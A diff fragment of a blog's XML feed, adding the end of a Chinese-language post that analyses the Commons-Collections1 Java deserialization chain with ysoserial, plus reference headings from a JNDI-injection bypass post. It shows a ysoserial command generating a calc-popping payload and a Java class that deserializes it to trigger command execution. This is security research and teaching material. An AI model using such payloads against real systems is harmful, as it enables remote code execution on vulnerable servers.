+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/37.png" class="">**ysoserial的构造巧在AnnotationInvocationHandler本身就是一个代理也就是实现了InvocationHandler**
+<h3 id="测试-2">测试</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 calc&gt;cc1.bin</span><br></pre></td></tr></table></figure>
+<p>反序列化</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ysoserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;cc1.bin&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>虽然报错了但是可以触发命令执行</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/38.png" class="">
+<h2 id="参考-7">参考</h2>
+<blockquote>
+<p><a href="https://www.freebuf.com/vuls/276632.html">Java反序列化之ysoserial cc1链分析</a></p>
+</blockquote>
+<h2 id="完-11">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Commons-Collections</category>
+      </categories>
+      <tags>
+        <tag>Java安全</tag>
+        <tag>反序列化</tag>
+        <tag>CC链</tag>
       </tags>
   </entry>
   <entry>
@@ -1114,12 +1273,12 @@
 <img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/30.png" class="">
 <h3 id="调用栈-2">调用栈</h3>
 <img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/31.png" class="">
-<h2 id="参考-7">参考</h2>
+<h2 id="参考-8">参考</h2>
 <blockquote>
 <p><a href="https://paper.seebug.org/942/#4-jdk-8u191">如何绕过高版本 JDK 的限制进行 JNDI 注入利用</a><a href="https://tttang.com/archive/1405/">探索高版本 JDK 下 JNDI 漏洞的利用方法</a><br>
 <a href="https://xz.aliyun.com/t/10656#toc-8">JNDI jdk高版本绕过—— Druid</a></p>
 </blockquote>
-<h2 id="完-11">完</h2>
+<h2 id="完-12">完</h2>
 <blockquote>
 <p>版权属于：Ho1aAs<br>
 欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
